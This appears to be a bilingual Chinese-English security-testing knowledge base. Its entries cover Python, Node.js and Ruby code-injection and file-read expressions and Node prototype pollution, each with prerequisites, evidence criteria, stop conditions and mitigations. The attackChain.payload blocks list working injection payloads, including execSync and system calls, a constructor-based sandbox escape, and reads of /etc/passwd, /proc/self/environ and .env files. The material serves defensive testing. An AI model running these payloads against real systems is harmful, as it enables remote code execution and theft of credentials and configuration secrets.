description.en: Prove the code-execution or webshell context first, then confirm the file-read prerequisites: the application exposes eval, templating, debugging, or task execution, the service identity can read the path, and no object mapping or root restriction exists.

title.zh: 建立专用测试文件基线
title.en: Establish a dedicated test-file baseline

description.zh: 挂载只含唯一标记的只读文件，记录规范路径、服务身份与权限，并以“预置测试文件的唯一标记、Python open 调用审计、工作进程和对应响应完整关联”作为读取证据。
description.en: Mount a read-only file containing one marker, record canonical path, identity, and permissions, and use a planted test-file marker, Python open-call auditing, worker process, and response fully correlate as read evidence.

title.zh: 逐 API 验证“Python 本地文件读取表达式”
title.en: Validate Python Local File Read Expressions by API

description.zh: 测试步骤为：先用字符串和算术确认表达式执行，再只读取挂载的无敏感测试文件；逐个 API 路径验证并禁止访问 .env、配置或 proc 数据。原命令保留用于引用，执行时所有敏感路径均替换为测试文件。
description.en: confirm expression evaluation with strings and arithmetic, then read only a mounted nonsensitive test file, validating API paths without accessing env, configuration, or proc data. Preserve original commands for reference while replacing every sensitive runtime path with the test file.

attackChain.payload:
open('/etc/passwd').read()
open('/flag').read()
open('/flag.txt').read()
open('/proc/self/environ').read()
open('/proc/self/cmdline').read()
open('/proc/version').read()
open('/proc/cpuinfo').read()
open('/proc/meminfo').read()
open('/proc/net/tcp').read()
open('app.py').read()
open('manage.py').read()
open('settings.py').read()
open('config.py').read()
open('requirements.txt').read()
open('.env').read()
open('Dockerfile').read()
open('docker-compose.yml').read()

title.zh: 收紧文件边界并回归
title.en: Tighten file boundaries and regress

description.zh: 实施“移除动态 Python 求值，文件访问通过服务端对象 ID 和固定根目录，服务账户最小化文件权限并避免将秘密放入工作目录”后验证合法对象、越界路径与符号链接，确认正常读取保留且服务身份无法越权。
description.en: After applying remove dynamic Python evaluation, map file access through server-side object IDs and a fixed root, minimize service file permissions, and keep secrets out of the working directory, test valid objects, out-of-root paths, and symlinks to preserve valid reads while preventing identity overreach.

review.rationale: Python 本地文件读取表达式保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已先证明“Python 本地文件读取表达式”依赖的 WebShell/代码执行上下文，并确认：应用存在 eval、模板、调试器或任务执行入口，服务身份可读目标路径，且没有文件对象映射与根目录限制。
prerequisites.en: The prerequisite webshell or code-execution context for Python Local File Read Expressions is proven, and the application exposes eval, templating, debugging, or task execution, the service identity can read the path, and no object mapping or root restriction exists.

prerequisites.zh: 隔离环境只挂载含随机标记的无敏感测试文件或目录，可观察预置测试文件的唯一标记、Python open 调用审计、工作进程和对应响应完整关联。
prerequisites.en: The isolated environment mounts only a nonsensitive marked test file or directory and can observe a planted test-file marker, Python open-call auditing, worker process, and response fully correlate.

analysis.zh: 阳性仅指服务身份通过指定 API 读到预置标记并取得预置测试文件的唯一标记、Python open 调用审计、工作进程和对应响应完整关联。路径回显、权限/不存在异常、目录名或在已有 Shell 中直接 cat 均不能证明“可控 Python 表达式是否以服务进程身份打开本地路径并把内容返回给请求者”。
analysis.en: A positive means the service identity reads the planted marker through the specified API and a planted test-file marker, Python open-call auditing, worker process, and response fully correlate. Reflected paths, permission or not-found errors, directory names, or direct cat from an existing shell do not prove whether a controllable Python expression opens local paths under the service identity and returns content to the requester.

opsecTips.zh: Python 本地文件读取表达式停止条件：只访问专用测试文件；响应出现真实配置、环境变量、令牌、用户数据或系统文件片段时立即停止并隔离输出。 本条重点观察“可控 Python 表达式是否以服务进程身份打开本地路径并把内容返回给请求者”。
opsecTips.en: Python Local File Read Expressions stop condition: Access only the dedicated test file; stop and isolate output if real configuration, environment values, tokens, user data, or system-file fragments appear. The entry-specific focus is whether a controllable Python expression opens local paths under the service identity and returns content to the requester.

opsecTips.zh: Python 本地文件读取表达式清理条件：测试后删除挂载文件和临时 WebShell，清空响应缓存并重建容器，确认报告与日志只保留随机标记。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Python Local File Read Expressions cleanup condition: Remove mounted files and temporary webshells, clear response caches, rebuild the container, and verify reports and logs retain only the random marker. Recheck that no triggerable state remains for this technique.

name.zh: Node.js 子进程与文件读取表达式

description.zh: 覆盖 child_process 的 execSync、exec、spawn，旧 mainModule 引用、Function 构造和 fs.readFileSync，验证可控 JavaScript 是否获得 Node 运行时能力。
description.en: Covers child_process execSync, exec, spawn, legacy mainModule references, Function construction, and fs.readFileSync to test whether controllable JavaScript gains Node runtime capabilities.

overview.zh: Node.js 子进程与文件读取表达式用于核对不可信表达式是否能解析 require、process 或 Function 构造器，并到达 child_process 或 fs API。该条目只在以下前提下适用：应用将用户值作为 JavaScript、模板表达式或反序列化函数执行，且运行环境未隔离 require、process 与文件系统能力。有效判定必须取得实际表达式入口、Node 版本、调用栈、固定子进程或测试文件标记和工作进程日志能够对应；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。
overview.en: Node.js Child-Process and File-Read Expressions checks whether an untrusted expression resolves require, process, or the Function constructor and reaches child_process or fs APIs. It applies when the application evaluates user data as JavaScript, a template expression, or a deserialized function without isolating require, process, and filesystem capabilities. A valid finding requires the expression entry, Node version, call stack, fixed child-process or test-file marker, and worker log correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution.

vulnerability.zh: 风险根因是应用将用户值作为 JavaScript、模板表达式或反序列化函数执行，且运行环境未隔离 require、process 与文件系统能力，使应用可能暴露“不可信表达式是否能解析 require、process 或 Function 构造器，并到达 child_process 或 fs API”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。
vulnerability.en: The risk exists when the application evaluates user data as JavaScript, a template expression, or a deserialized function without isolating require, process, and filesystem capabilities, exposing the runtime boundary of whether an untrusted expression resolves require, process, or the Function constructor and reaches child_process or fs APIs. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability.

exploitation.zh: 先用算术与对象属性确认表达式执行，再分别用固定 echo 和专用测试文件验证 child_process 与 fs，标记已移除的 mainModule 路径。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。
exploitation.en: confirm expression evaluation with arithmetic and object properties, then test child_process and fs separately with fixed echo and a dedicated test file while tagging removed mainModule paths. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes.

mitigation.zh: 不执行用户 JavaScript 或函数字符串，采用数据 schema 与固定操作，隔离 worker 能力并限制 child_process、fs 与 process 暴露。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。
mitigation.en: do not evaluate user JavaScript or function strings, use data schemas and fixed operations, isolate worker capabilities, and restrict child_process, fs, and process exposure. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths.

title.zh: 确认“Node.js 子进程与文件读取表达式”执行入口
title.en: Confirm the Node.js Child-Process and File-Read Expressions execution entry

description.zh: 定位真实输入、处理器与最终 API，核对前提“应用将用户值作为 JavaScript、模板表达式或反序列化函数执行，且运行环境未隔离 require、process 与文件系统能力”，并记录运行时版本和服务身份。
description.en: Locate the real input, handler, and final API, confirm that the application evaluates user data as JavaScript, a template expression, or a deserialized function without isolating require, process, and filesystem capabilities, and record runtime version and service identity.

title.zh: 建立“Node.js 运行时能力访问”安全基线
title.en: Establish the Node.js Runtime Capability Access baseline

description.zh: 使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“实际表达式入口、Node 版本、调用栈、固定子进程或测试文件标记和工作进程日志能够对应”作为异常证据。
description.en: Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting the expression entry, Node version, call stack, fixed child-process or test-file marker, and worker log correlate as abnormal evidence.

title.zh: 逐行验证“Node.js 子进程与文件读取表达式”
title.en: Validate Node.js Child-Process and File-Read Expressions line by line

description.zh: 测试步骤为：先用算术与对象属性确认表达式执行，再分别用固定 echo 和专用测试文件验证 child_process 与 fs，标记已移除的 mainModule 路径。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。
description.en: confirm expression evaluation with arithmetic and object properties, then test child_process and fs separately with fixed echo and a dedicated test file while tagging removed mainModule paths. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker.

attackChain.payload:
require('child_process').execSync('id').toString()
require('child_process').execSync('whoami').toString()
require('child_process').execSync('cat /flag').toString()
require('child_process').execSync('ls /').toString()
require('child_process').exec('id')
require('child_process').exec('whoami')
require('child_process').exec('cat /flag')
require('child_process').exec('ls /')
require('child_process').spawn('id')
require('child_process').spawn('whoami')
require('child_process').spawn('cat /flag')
require('child_process').spawn('ls /')
global.process.mainModule.require('child_process').execSync('id').toString()
global.process.mainModule.require('child_process').execSync('whoami').toString()
global.process.mainModule.require('child_process').execSync('cat /flag').toString()
global.process.mainModule.require('child_process').execSync('ls /').toString()
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami').toString()
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /flag').toString()
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('ls /').toString()
require('fs').readFileSync('/etc/passwd').toString()
require('fs').readFileSync('/flag').toString()
require('fs').readFileSync('/flag.txt').toString()
require('fs').readFileSync('/proc/self/environ').toString()
require('fs').readFileSync('/proc/self/cmdline').toString()
require('fs').readFileSync('/proc/version').toString()
require('fs').readFileSync('.env').toString()
require('fs').readFileSync('package.json').toString()
require('fs').readFileSync('server.js').toString()
require('fs').readFileSync('app.js').toString()
require('fs').readFileSync('index.js').toString()
require('fs').readFileSync('config.js').toString()

title.zh: 修复运行时边界并回归
title.en: Remediate and regress the runtime boundary

description.zh: 实施“不执行用户 JavaScript 或函数字符串，采用数据 schema 与固定操作，隔离 worker 能力并限制 child_process、fs 与 process 暴露”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。
description.en: After applying do not evaluate user JavaScript or function strings, use data schemas and fixed operations, isolate worker capabilities, and restrict child_process, fs, and process exposure, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable.

review.rationale: Node.js 子进程与文件读取表达式保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已在授权隔离环境定位“Node.js 子进程与文件读取表达式”的真实输入点、处理器和运行时版本，并确认：应用将用户值作为 JavaScript、模板表达式或反序列化函数执行，且运行环境未隔离 require、process 与文件系统能力。
prerequisites.en: The authorized isolated environment identifies the real input, handler, and runtime version for Node.js Child-Process and File-Read Expressions, confirming that the application evaluates user data as JavaScript, a template expression, or a deserialized function without isolating require, process, and filesystem capabilities.

prerequisites.zh: 测试 worker 可随时销毁，并能同时观察实际表达式入口、Node 版本、调用栈、固定子进程或测试文件标记和工作进程日志能够对应。
prerequisites.en: The test worker is disposable and can observe the expression entry, Node version, call stack, fixed child-process or test-file marker, and worker log correlate.

analysis.zh: 阳性要求可控输入连续到达危险运行时 API，并取得实际表达式入口、Node 版本、调用栈、固定子进程或测试文件标记和工作进程日志能够对应。代码片段、语法错误、HTTP 200、参数回显，或在已有本地 Shell 中手工运行命令均属假阳性或前置能力，不能证明“不可信表达式是否能解析 require、process 或 Function 构造器，并到达 child_process 或 fs API”。
analysis.en: A positive requires a continuous path from controllable input to a dangerous runtime API plus the expression entry, Node version, call stack, fixed child-process or test-file marker, and worker log correlate. Snippets, syntax errors, HTTP 200, reflection, or manual commands after an existing shell are false positives or prerequisites and do not prove whether an untrusted expression resolves require, process, or the Function constructor and reaches child_process or fs APIs.

opsecTips.zh: Node.js 子进程与文件读取表达式停止条件：“Node.js 子进程与文件读取表达式”只允许使用一次性固定标记；出现非预期子进程、外部网络、文件写入或权限变化时，立即终止 worker 并停止测试。 本条重点观察“不可信表达式是否能解析 require、process 或 Function 构造器，并到达 child_process 或 fs API”。
opsecTips.en: Node.js Child-Process and File-Read Expressions stop condition: Use only a one-time fixed marker for Node.js Child-Process and File-Read Expressions; terminate the worker and stop on unexpected child processes, external network, writes, or privilege changes. The entry-specific focus is whether an untrusted expression resolves require, process, or the Function constructor and reaches child_process or fs APIs.

opsecTips.zh: Node.js 子进程与文件读取表达式清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Node.js Child-Process and File-Read Expressions cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique.

name.zh: Node.js 原型污染到进程选项
name.en: Node.js Prototype Pollution to Process Options

description.zh: 通过 __proto__ 或 constructor.prototype 注入 shell、env、NODE_OPTIONS、argv0 与 execArgv，验证污染属性是否流入子进程创建选项。
description.en: Injects shell, env, NODE_OPTIONS, argv0, and execArgv through proto or constructor.prototype to test whether polluted properties flow into child-process options.

overview.zh: Node.js 原型污染到进程选项检查对象合并产生的原型属性是否被 child_process 或进程启动包装器当作自有 shell、env 或 execArgv 选项使用。成立前提是攻击者可污染 Object.prototype，应用随后使用普通对象构造子进程选项且未验证自有属性、类型和允许键。有效证据为污染前后对象属性所有权、传给 child_process 的最终选项与一次性固定进程标记连续可见；看到 __proto__ 字段被接受或普通对象出现哨兵属性，只能证明污染候选，不能证明已到达进程执行 sink。
overview.en: Node.js Prototype Pollution to Process Options checks whether prototype properties created by object merging are consumed as owned shell, env, or execArgv options by child_process or process-launch wrappers. It applies when an attacker can pollute Object.prototype and the application later builds child-process options from ordinary objects without own-property, type, and key validation. Evidence requires property ownership before and after pollution, final child-process options, and a one-time fixed process marker are continuously observable; acceptance of proto fields or a sentinel on an ordinary object proves only a pollution candidate, not process execution.

vulnerability.zh: 根因是攻击者可污染 Object.prototype，应用随后使用普通对象构造子进程选项且未验证自有属性、类型和允许键，污染属性可能沿普通对象默认值传播到“对象合并产生的原型属性是否被 child_process 或进程启动包装器当作自有 shell、env 或 execArgv 选项使用”。必须依次证明污染写入、属性继承、危险选项读取与子进程行为，且每一步都排除对象自有属性和应用显式配置。
vulnerability.en: The root cause is an attacker can pollute Object.prototype and the application later builds child-process options from ordinary objects without own-property, type, and key validation, allowing polluted defaults to propagate toward whether prototype properties created by object merging are consumed as owned shell, env, or execArgv options by child_process or process-launch wrappers. Prove pollution write, inherited property, dangerous option consumption, and child behavior in sequence while excluding owned properties and explicit configuration.

exploitation.zh: 先污染无害哨兵属性并检查 Object.hasOwn，再在隔离 worker 中用固定 echo 验证选项传播，每个 JSON 变体单独重放。先使用无害哨兵属性验证污染和所有权，再在一次性 worker 中用固定 echo 检查选项传播；每个 JSON 变体独立运行，结束后销毁进程，避免全局原型状态污染其他测试。
exploitation.en: pollute a harmless sentinel property and inspect Object.hasOwn first, then validate option propagation with fixed echo in an isolated worker, replaying each JSON variant separately. Verify pollution and ownership with a harmless sentinel before testing option propagation with fixed echo in a disposable worker; run each JSON independently and destroy the process to prevent cross-test prototype state.

mitigation.zh: 拒绝 __proto__/prototype/constructor 键，使用无原型对象和 schema 允许列表，读取子进程选项前检查自有属性并显式构造 env 与 execArgv。修复后重放合法嵌套对象、三个危险键和原始选项变体，确认 schema 合并仍满足业务需求，同时所有子进程选项只来自显式自有属性。
mitigation.en: reject proto, prototype, and constructor keys, use null-prototype objects and schema allowlists, check own properties, and explicitly construct env and execArgv before process creation. Replay valid nested objects, the three dangerous keys, and original option variants to preserve schema merging while all child-process options come only from explicit owned properties.

title.zh: 确认原型污染写入点
title.en: Confirm the prototype-pollution write

description.zh: 使用无害哨兵键验证污染来源、对象所有权与清理范围，核对前提“攻击者可污染 Object.prototype，应用随后使用普通对象构造子进程选项且未验证自有属性、类型和允许键”。
description.en: Use a harmless sentinel to verify pollution source, ownership, and cleanup scope, confirming that an attacker can pollute Object.prototype and the application later builds child-process options from ordinary objects without own-property, type, and key validation.

title.zh: 追踪子进程选项消费
title.en: Trace child-process option consumption

description.zh: 断点记录 shell、env、argv0 与 execArgv 的最终值和属性所有权，以“污染前后对象属性所有权、传给 child_process 的最终选项与一次性固定进程标记连续可见”作为完整链路证据。
description.en: Record final shell, env, argv0, and execArgv values plus ownership, using property ownership before and after pollution, final child-process options, and a one-time fixed process marker are continuously observable as full-chain evidence.

title.zh: 隔离重放“Node.js 原型污染到进程选项”JSON
title.en: Replay Node.js Prototype Pollution to Process Options JSON in isolation

description.zh: 测试步骤为：先污染无害哨兵属性并检查 Object.hasOwn，再在隔离 worker 中用固定 echo 验证选项传播，每个 JSON 变体单独重放。每个 JSON 在新 worker 中运行，并用固定 echo 替代系统动作。
description.en: pollute a harmless sentinel property and inspect Object.hasOwn first, then validate option propagation with fixed echo in an isolated worker, replaying each JSON variant separately. Run each JSON in a fresh worker and replace system behavior with fixed echo.

title.zh: 拒绝危险键并显式构造选项
title.en: Reject dangerous keys and build options explicitly

description.zh: 实施“拒绝 __proto__/prototype/constructor 键，使用无原型对象和 schema 允许列表，读取子进程选项前检查自有属性并显式构造 env 与 execArgv”后重放合法对象与所有污染变体，确认合并功能保留且继承属性不进入进程 API。
description.en: Apply reject proto, prototype, and constructor keys, use null-prototype objects and schema allowlists, check own properties, and explicitly construct env and execArgv before process creation, replay valid objects and pollution variants, and preserve merging without inherited process options.

review.rationale: Node.js 原型污染到进程选项保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已定位“Node.js 原型污染到进程选项”的对象合并入口和子进程 sink，并确认：攻击者可污染 Object.prototype，应用随后使用普通对象构造子进程选项且未验证自有属性、类型和允许键。
prerequisites.en: The object-merge entry and child-process sink for Node.js Prototype Pollution to Process Options are identified, and an attacker can pollute Object.prototype and the application later builds child-process options from ordinary objects without own-property, type, and key validation.

prerequisites.zh: 每个用例在新 Node worker 运行，可观察属性所有权、最终选项和污染前后对象属性所有权、传给 child_process 的最终选项与一次性固定进程标记连续可见。
prerequisites.en: Each case runs in a fresh Node worker and can observe property ownership, final options, and property ownership before and after pollution, final child-process options, and a one-time fixed process marker are continuously observable.

analysis.zh: 阳性必须依次证明污染写入、继承属性读取、进程选项消费和污染前后对象属性所有权、传给 child_process 的最终选项与一次性固定进程标记连续可见。JSON 被接受、原型有哨兵但 sink 未读取、或自有属性覆盖污染值均是假阳性，不能证明“对象合并产生的原型属性是否被 child_process 或进程启动包装器当作自有 shell、env 或 execArgv 选项使用”。
analysis.en: A positive proves pollution write, inherited read, process-option consumption, and property ownership before and after pollution, final child-process options, and a one-time fixed process marker are continuously observable. Accepted JSON, an unconsumed prototype sentinel, or an owned property overriding pollution are false positives and do not prove whether prototype properties created by object merging are consumed as owned shell, env, or execArgv options by child_process or process-launch wrappers.

opsecTips.zh: Node.js 原型污染到进程选项停止条件：只用无害哨兵和固定 echo；污染进入共享主进程、真实 env/NODE_OPTIONS 或并行请求时，立即终止整个实例。 本条重点观察“对象合并产生的原型属性是否被 child_process 或进程启动包装器当作自有 shell、env 或 execArgv 选项使用”。
opsecTips.en: Node.js Prototype Pollution to Process Options stop condition: Use harmless sentinels and fixed echo only; terminate the instance if pollution reaches the shared process, real env or NODE_OPTIONS, or concurrent requests. The entry-specific focus is whether prototype properties created by object merging are consumed as owned shell, env, or execArgv options by child_process or process-launch wrappers.

opsecTips.zh: Node.js 原型污染到进程选项清理条件：每个 JSON 后销毁 worker；完成后重启应用、确认 Object.prototype 无哨兵并清空队列/缓存。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Node.js Prototype Pollution to Process Options cleanup condition: Destroy the worker after each JSON; restart the app, verify Object.prototype has no sentinel, and clear queues and caches. Recheck that no triggerable state remains for this technique.

name.zh: Ruby 命令执行表达式集合

description.zh: 覆盖 Kernel.system/exec、IO.popen、反引号、Open3 与 File.read，验证可控 Ruby 表达式是否到达进程执行或文件读取能力。
description.en: Covers Kernel.system or exec, IO.popen, backticks, Open3, and File.read to test whether controllable Ruby expressions reach process or file capabilities.

overview.zh: Ruby 命令执行表达式集合用于核对用户可控 Ruby 代码是否调用多种进程 API 或读取本地文件，并如何返回标准输出。该条目只在以下前提下适用：模板、控制台、规则引擎或反序列化入口执行不可信 Ruby 表达式，且进程权限允许子进程或文件访问。有效判定必须取得Ruby 调用栈、API 类型、固定 echo 或测试文件标记与工作进程日志可关联；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。
overview.en: Ruby Command Execution Expression Set checks whether controllable Ruby code invokes several process APIs or local file reads and how stdout is returned. It applies when a template, console, rule engine, or deserialization entry evaluates untrusted Ruby expressions and the process identity can spawn children or access files. A valid finding requires the Ruby call stack, API type, fixed echo or test-file marker, and worker logs correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution.

vulnerability.zh: 风险根因是模板、控制台、规则引擎或反序列化入口执行不可信 Ruby 表达式，且进程权限允许子进程或文件访问，使应用可能暴露“用户可控 Ruby 代码是否调用多种进程 API 或读取本地文件，并如何返回标准输出”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。
vulnerability.en: The risk exists when a template, console, rule engine, or deserialization entry evaluates untrusted Ruby expressions and the process identity can spawn children or access files, exposing the runtime boundary of whether controllable Ruby code invokes several process APIs or local file reads and how stdout is returned. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability.

exploitation.zh: 分别按 system、exec、popen、反引号、Open3 与 File.read 分组，只使用固定 echo 和专用测试文件，并记录 exec 替换进程的差异。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。
exploitation.en: group system, exec, popen, backticks, Open3, and File.read separately, use only fixed echo and a dedicated test file, and record process replacement by exec. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes.

mitigation.zh: 移除不可信 Ruby 求值，业务动作使用固定方法与参数数组，隔离任务 worker 并限制进程、文件和网络权限。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。
mitigation.en: remove untrusted Ruby evaluation, use fixed methods with argument arrays for business actions, isolate task workers, and restrict process, file, and network permissions. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths.

title.zh: 确认“Ruby 命令执行表达式集合”执行入口
title.en: Confirm the Ruby Command Execution Expression Set execution entry

description.zh: 定位真实输入、处理器与最终 API，核对前提“模板、控制台、规则引擎或反序列化入口执行不可信 Ruby 表达式，且进程权限允许子进程或文件访问”，并记录运行时版本和服务身份。
description.en: Locate the real input, handler, and final API, confirm that a template, console, rule engine, or deserialization entry evaluates untrusted Ruby expressions and the process identity can spawn children or access files, and record runtime version and service identity.

title.zh: 建立“Ruby 进程与文件 API”安全基线
title.en: Establish the Ruby Process and File APIs baseline

description.zh: 使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“Ruby 调用栈、API 类型、固定 echo 或测试文件标记与工作进程日志可关联”作为异常证据。
description.en: Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting the Ruby call stack, API type, fixed echo or test-file marker, and worker logs correlate as abnormal evidence.

title.zh: 逐行验证“Ruby 命令执行表达式集合”
title.en: Validate Ruby Command Execution Expression Set line by line

description.zh: 测试步骤为：分别按 system、exec、popen、反引号、Open3 与 File.read 分组，只使用固定 echo 和专用测试文件，并记录 exec 替换进程的差异。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。
description.en: group system, exec, popen, backticks, Open3, and File.read separately, use only fixed echo and a dedicated test file, and record process replacement by exec. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker.

attackChain.payload:
system('id')
system('whoami')
system('cat /flag')
system('ls /')
system('pwd')
system('uname -a')
system('hostname')
exec('id')
exec('whoami')
exec('cat /flag')
exec('ls /')
exec('pwd')
exec('uname -a')
exec('hostname')
IO.popen('id'){|f| f.read}
IO.popen('whoami'){|f| f.read}
IO.popen('cat /flag'){|f| f.read}
IO.popen('ls /'){|f| f.read}
IO.popen('pwd'){|f| f.read}
IO.popen('uname -a'){|f| f.read}
IO.popen('hostname'){|f| f.read}
%x(id)
%x(whoami)
%x(cat /flag)
%x(ls /)
%x(pwd)
%x(uname -a)
%x(hostname)
Kernel.exec('id')
Kernel.exec('whoami')
Kernel.exec('cat /flag')
Kernel.exec('ls /')
Kernel.exec('pwd')
Kernel.exec('uname -a')
Kernel.exec('hostname')
Kernel.system('id')
Kernel.system('whoami')
Kernel.system('cat /flag')
Kernel.system('ls /')
Kernel.system('pwd')
Kernel.system('uname -a')
Kernel.system('hostname')
Open3.capture2('id')
Open3.capture2('whoami')
Open3.capture2('cat /flag')
Open3.capture2('ls /')
Open3.capture2('pwd')
Open3.capture2('uname -a')
Open3.capture2('hostname')
File.read('/etc/passwd')

title.zh: 修复运行时边界并回归
title.en: Remediate and regress the runtime boundary

description.zh: 实施“移除不可信 Ruby 求值，业务动作使用固定方法与参数数组，隔离任务 worker 并限制进程、文件和网络权限”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。
description.en: After applying remove untrusted Ruby evaluation, use fixed methods with argument arrays for business actions, isolate task workers, and restrict process, file, and network permissions, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable.

review.rationale: Ruby 命令执行表达式集合保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已在授权隔离环境定位“Ruby 命令执行表达式集合”的真实输入点、处理器和运行时版本，并确认：模板、控制台、规则引擎或反序列化入口执行不可信 Ruby 表达式，且进程权限允许子进程或文件访问。
prerequisites.en: The authorized isolated environment identifies the real input, handler, and runtime version for Ruby Command Execution Expression Set, confirming that a template, console, rule engine, or deserialization entry evaluates untrusted Ruby expressions and the process identity can spawn children or access files.

prerequisites.zh: 测试 worker 可随时销毁，并能同时观察Ruby 调用栈、API 类型、固定 echo 或测试文件标记与工作进程日志可关联。
prerequisites.en: The test worker is disposable and can observe the Ruby call stack, API type, fixed echo or test-file marker, and worker logs correlate.

analysis.zh: 阳性要求可控输入连续到达危险运行时 API，并取得Ruby 调用栈、API 类型、固定 echo 或测试文件标记与工作进程日志可关联。代码片段、语法错误、HTTP 200、参数回显，或在已有本地 Shell 中手工运行命令均属假阳性或前置能力，不能证明“用户可控 Ruby 代码是否调用多种进程 API 或读取本地文件，并如何返回标准输出”。
analysis.en: A positive requires a continuous path from controllable input to a dangerous runtime API plus the Ruby call stack, API type, fixed echo or test-file marker, and worker logs correlate. Snippets, syntax errors, HTTP 200, reflection, or manual commands after an existing shell are false positives or prerequisites and do not prove whether controllable Ruby code invokes several process APIs or local file reads and how stdout is returned.

opsecTips.zh: Ruby 命令执行表达式集合停止条件：“Ruby 命令执行表达式集合”只允许使用一次性固定标记；出现非预期子进程、外部网络、文件写入或权限变化时，立即终止 worker 并停止测试。 本条重点观察“用户可控 Ruby 代码是否调用多种进程 API 或读取本地文件，并如何返回标准输出”。
opsecTips.en: Ruby Command Execution Expression Set stop condition: Use only a one-time fixed marker for Ruby Command Execution Expression Set; terminate the worker and stop on unexpected child processes, external network, writes, or privilege changes. The entry-specific focus is whether controllable Ruby code invokes several process APIs or local file reads and how stdout is returned.

opsecTips.zh: Ruby 命令执行表达式集合清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Ruby Command Execution Expression Set cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique.

name.zh: Python YAML 对象构造执行标签

description.zh: 原名称误称 Ruby；全部 16 行实际为 PyYAML 的 python/object/apply 或 object/new 标签，调用 os.system、subprocess 与 os.popen。
description.en: The original name incorrectly says Ruby; all sixteen lines are PyYAML python/object/apply or object/new tags invoking os.system, subprocess, or os.popen.

overview.zh: Python YAML 对象构造执行标签检查YAML loader 是否允许 python/object/apply 与 object/new 构造任意 Python 调用对象。成立前提为：服务对不可信 YAML 使用 yaml.load、UnsafeLoader 或等价全功能 loader，而不是 SafeLoader。反序列化风险必须通过实际 Loader 类型、YAML 标签解析日志和隔离 worker 的固定无害调用标记能够对应进行确认；仅识别到流头、类名或标签，不足以证明对象图已被加载或产生副作用。
overview.en: Python YAML Object-Construction Execution Tags checks whether a YAML loader permits python/object/apply and object/new tags to construct arbitrary Python call objects. It applies when the service loads untrusted YAML through yaml.load, UnsafeLoader, or an equivalent full-feature loader instead of SafeLoader. Deserialization risk requires the actual Loader type, YAML tag-resolution log, and fixed harmless call marker from an isolated worker correlate; a stream header, class name, or tag alone does not prove object loading or side effects.

vulnerability.zh: 根因是服务对不可信 YAML 使用 yaml.load、UnsafeLoader 或等价全功能 loader，而不是 SafeLoader，不可信数据因此可能触发“YAML loader 是否允许 python/object/apply 与 object/new 构造任意 Python 调用对象”。真实影响由加载 API、允许类型、依赖版本、对象生命周期和服务权限共同决定，必须区分格式识别、对象实例化、gadget 触发与最终副作用四个阶段。
